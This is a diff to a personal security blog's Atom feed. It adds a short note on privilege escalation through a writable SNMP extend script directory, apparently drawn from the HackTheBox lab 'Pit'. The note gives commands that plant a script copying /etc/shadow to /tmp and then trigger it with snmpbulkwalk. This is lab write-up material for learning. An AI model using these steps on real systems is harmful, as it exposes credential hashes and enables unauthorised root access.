@@ -4,13 +4,74 @@
  <title>Spindel</title>
  <link href="https://mvineza.github.io/spindel/atom.xml" rel="self"/>
  <link href="https://mvineza.github.io/spindel/"/>
- <updated>2022-05-28T18:16:24+08:00</updated>
+ <updated>2022-06-02T19:07:08+08:00</updated>
  <id>https://mvineza.github.io</id>
  <author>
    <name>spindel</name>
    <email>rell.vineza14@yahoo.com</email>
  </author>
 
+ 
+ <entry>
+   <title>SNMP Extended Script</title>
+   <link href="https://mvineza.github.io/spindel/2022/06/02/snmp-extended-script"/>
+   <updated>2022-06-02T00:00:00+08:00</updated>
+   <id>https://mvineza.github.io/2022/06/02/SNMP-Extended-Script</id>
+   <content type="html">&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
+&lt;p&gt;Attacker can do privesc if it can gain access to SNMP extensions.&lt;/p&gt;
+
+&lt;h2 id=&quot;environment-setup&quot;&gt;Environment Setup&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;SNMP extension enabled using custom script and low privileged user has write access to custom scripts directory.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@pit ~]# &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/snmp/snmpd.conf | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;extend
+extend monitoring /usr/bin/monitor
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@pit ~]# 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@pit ~]# &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /usr/bin/monitor 
+&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;script &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /usr/local/monitoring/check&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;sh
+&lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
+    /bin/bash &lt;span class=&quot;nv&quot;&gt;$script&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@pit ~]# 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@pit ~]# getfacl /usr/local/monitoring/
+getfacl: Removing leading &lt;span class=&quot;s1&quot;&gt;&apos;/&apos;&lt;/span&gt; from absolute path names
+&lt;span class=&quot;c&quot;&gt;# file: usr/local/monitoring/&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# owner: root&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# group: root&lt;/span&gt;
+user::rwx
+user:michelle:-wx
+group::rwx
+mask::rwx
+other::---
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@pit ~]# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;steps&quot;&gt;Steps&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Create malicious script&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;#!/bin/bash\ncat /etc/shadow &amp;gt; /tmp/shadow.txt&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /usr/local/monitoring/check_evil.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Trigger SNMP extension&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 10.10.10.241 - victim IP&lt;/span&gt;
+snmpbulkwalk &lt;span class=&quot;nt&quot;&gt;-On&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r1&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v2c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; public 10.10.10.241 1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;HTB Pit&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+ </entry>
  
  <entry>
    <title>Uploading malicuous JAR or WAR file</title>
